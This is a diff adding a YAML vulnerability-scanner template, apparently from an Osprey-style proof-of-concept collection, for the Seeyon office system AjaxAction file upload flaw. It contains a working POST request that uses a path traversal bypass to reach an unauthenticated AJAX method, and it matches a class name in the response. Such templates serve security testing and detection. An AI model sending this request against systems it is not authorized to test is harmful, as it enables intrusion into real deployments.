@@ -1,0 +1,17 @@
+id: poc-yaml-seeyon-ajaxaction-file-upload
+info:
+  name: Seeyon 协同办公系统 AjaxAction 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: Seeyon
+  osprey-id: vb_2021_0002
+requests:
+- method: POST
+  path: /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: managerMethod=toString
+  expression: contains(body, "com.seeyon.ctp.common.formula.manager.FormulaManagerImpl")
+variables: {}
+transport: http
